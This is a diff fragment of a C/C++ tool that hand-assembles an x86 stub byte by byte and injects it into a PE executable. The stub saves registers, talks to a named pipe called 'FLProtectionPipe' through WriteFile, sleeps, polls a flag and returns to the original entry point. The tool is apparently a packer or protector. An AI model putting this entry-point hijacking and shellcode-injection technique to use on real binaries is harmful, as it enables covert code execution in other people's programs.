 		memcpy((void*)&cImageBase, (void*)&pNtH->OptionalHeader.ImageBase, 4);
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
-		buf[stSize + i32stSizeCnt++] = '\x04';// add ecx, 0x4
+		buf[stSize + i32stSizeCnt++] = '\xc6';
+		buf[stSize + i32stSizeCnt++] = '\x04';// add esi, 0x4
 
 		buf[stSize + i32stSizeCnt++] = '\xbf';
 		buf[stSize + i32stSizeCnt++] = cImageBase[0];
@@ -1172,148 +1083,108 @@ int main(int argc, char* argv[])
 		buf[stSize + i32stSizeCnt++] = cImageBase[3];
 
 		buf[stSize + i32stSizeCnt++] = '\x89';
-		buf[stSize + i32stSizeCnt++] = '\x39';
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x54';
-		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x44';
-		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x1c';//mov eax,dword ptr[esp+0x1c]
+		buf[stSize + i32stSizeCnt++] = '\x3e';// mov [esi],edi
 
 		buf[stSize + i32stSizeCnt++] = '\x05';
-		buf[stSize + i32stSizeCnt++] = '\x60';
+		buf[stSize + i32stSizeCnt++] = '\x50';
 		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';//add eax,0x460
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// mov eax,0x450
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xf0';//mov edi,eax
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc6';//mov esi, eax
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc0';
-		buf[stSize + i32stSizeCnt++] = '\x4';//add eax, 04
+		buf[stSize + i32stSizeCnt++] = '\x08';// add eax,8
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xf8';//mov esi,eax
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc7';// mov edi, eax
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x5c';
-		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x08';// mov ebx,[esp+0x8]
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xf1';// mov ecx, esi
 
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xfa';//mov edx,edi
 
-		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x0';//push 0
-
-		buf[stSize + i32stSizeCnt++] = '\x56';// push edi
-
-		buf[stSize + i32stSizeCnt++] = '\x68';
+		buf[stSize + i32stSizeCnt++] = '\xbb';
 		buf[stSize + i32stSizeCnt++] = '\x0';
 		buf[stSize + i32stSizeCnt++] = '\x04';
 		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';// push 0x400
+		buf[stSize + i32stSizeCnt++] = '\x0';// mov ebx,0x400
 
-		buf[stSize + i32stSizeCnt++] = '\x57';//push esi
+		buf[stSize + i32stSizeCnt++] = '\x83';
+		buf[stSize + i32stSizeCnt++] = '\xe8';
+		buf[stSize + i32stSizeCnt++] = '\x04';// sub eax, 4
 
-		buf[stSize + i32stSizeCnt++] = '\x52';//push edx
+		buf[stSize + i32stSizeCnt++] = '\x6a';
+		buf[stSize + i32stSizeCnt++] = '\x0';// push 0
 
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
+
+		buf[stSize + i32stSizeCnt++] = '\x53';// push ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x52';// push edx
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx <- WriteFile
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x4c';
+		buf[stSize + i32stSizeCnt++] = '\x74';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x1c';//mov ecx,[esp+0x1c]
-
-		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
-		buf[stSize + i32stSizeCnt++] = '\xa0';
-		buf[stSize + i32stSizeCnt++] = '\x05';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x54';
-		buf[stSize + i32stSizeCnt++] = '\x24';//mov edx,[esp]
-		buf[stSize + i32stSizeCnt++] = '\x18';
+		buf[stSize + i32stSizeCnt++] = '\x14';// push [esp+0x14]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x5c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x14';
-
-		buf[stSize + i32stSizeCnt++] = '\x51';
-		buf[stSize + i32stSizeCnt++] = '\x52';
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov ebx,[esp+0x24]
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';//call ebx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xd8';//mov ebx,eax
-
-		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc4';
-		buf[stSize + i32stSizeCnt++] = '\x1c';//add esp,0c
+		buf[stSize + i32stSizeCnt++] = '\xd3';
 
 		buf[stSize + i32stSizeCnt++] = '\x68';
 		buf[stSize + i32stSizeCnt++] = '\xe8';
 		buf[stSize + i32stSizeCnt++] = '\x03';
 		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';//push 1000
+		buf[stSize + i32stSizeCnt++] = '\x0';// push 1000(seconds)
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x5c';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x10';//mov ebx,dword ptr[esp+0x10]
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';//call ebx
+		buf[stSize + i32stSizeCnt++] = '\xd3';//cal; ebx
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x24';//mov eax,[esp]
+		buf[stSize + i32stSizeCnt++] = '\x44';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x28';//mov eax,[esp+0x28]
 
-		buf[stSize + i32stSizeCnt++] = '\x5';
+		buf[stSize + i32stSizeCnt++] = '\x05';
 		buf[stSize + i32stSizeCnt++] = '\x78';
 		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x0';//add eax,0x460
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// add eax,0x478
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x00';
+		buf[stSize + i32stSizeCnt++] = '\x0';// mov eax,[eax]
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xf8';
 		buf[stSize + i32stSizeCnt++] = '\x01';//cmp eax, 1
 
 		buf[stSize + i32stSizeCnt++] = '\x75';
-		buf[stSize + i32stSizeCnt++] = '\xea';//if(eax==1)
+		buf[stSize + i32stSizeCnt++] = '\xe5';// jne up
 
+		i32TotalStackPop += 10;
+		char cTotalStackPop[4] = { 0 };
+		i32TotalStackPop *= 4;
+		memcpy((void*)&cTotalStackPop, (void*)&i32TotalStackPop, 4);
 
-		buf[stSize + i32stSizeCnt++] = '\x83';
+		buf[stSize + i32stSizeCnt++] = '\x81';
 		buf[stSize + i32stSizeCnt++] = '\xc4';
-		buf[stSize + i32stSizeCnt++] = '\x08';//add esp,0x4
-
-
-
-
+		buf[stSize + i32stSizeCnt++] = cTotalStackPop[0];
+		buf[stSize + i32stSizeCnt++] = cTotalStackPop[1];
+		buf[stSize + i32stSizeCnt++] = cTotalStackPop[2];
+		buf[stSize + i32stSizeCnt++] = cTotalStackPop[3];
 
 
 		buf[stSize + i32stSizeCnt++] = '\x61';//popad <- Last
@@ -1333,7 +1204,7 @@ int main(int argc, char* argv[])
 		buf[stSize + i32stSizeCnt++] = cFLfunctionToEntryPoint[2];
 		buf[stSize + i32stSizeCnt++] = cFLfunctionToEntryPoint[3];
 
-		
+
 		char cPipe[] = "\\\\.\\pipe\\FLProtectionPipe";
 		int i32PipeSize = strlen(cPipe);
 		int i32Name = strlen(pNameDes);
@@ -1457,10 +1328,22 @@ int main(int argc, char* argv[])
 			}
 		}
 
-		buf[stSize + 0x470] = '\x00';
-		buf[stSize + 0x471] = '\x00';
-		buf[stSize + 0x472] = '\x00';
-		buf[stSize + 0x473] = '\x00';
+		char cGetOutPutDebugString[] = "OutputDebugStringA";
+		int32_t i32GetOutPutDebugString = strlen(cGetOutPutDebugString);
+		for(int i = 0; i < i32GetOutPutDebugString; i++)
+		{
+			buf[stSize + 0x600 + i] = cGetOutPutDebugString[i];
+			if(i == i32GetOutPutDebugString - 1)
+			{
+				buf[stSize + 0x600 + i + 1] = '\x00';
+				buf[stSize + 0x600 + i + 2] = '\x00';
+			}
+		}
+
+		buf[stSize + 0x47c] = '\x00';
+		buf[stSize + 0x47d] = '\x00';
+		buf[stSize + 0x47e] = '\x00';
+		buf[stSize + 0x47f] = '\x00';
 
 		std::vector<std::pair<int, int> > vctRelocationVector;
 
